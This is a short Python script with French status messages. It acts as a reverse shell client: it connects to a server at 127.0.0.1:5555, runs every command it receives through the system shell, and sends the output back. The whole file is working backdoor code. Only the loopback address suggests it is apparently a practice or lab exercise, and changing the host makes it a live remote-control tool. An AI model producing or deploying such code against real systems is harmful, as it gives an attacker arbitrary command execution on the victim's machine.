import socket
import subprocess

host, port = ('127.0.0.1', 5555)
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try :
    socket.connect((host, port))
    print(" /!\ Client connecté /!\ \n")

    while True:
        command = socket.recv(9999)
        command = command.decode("utf8")

        print(command)

        result = subprocess.check_output(command, shell=True)
        print(result.decode("utf-8"))
        socket.send(result)

except:
    print(' /!\ Connexion au serveur échouée /!\ ')
finally:
    socket.close()
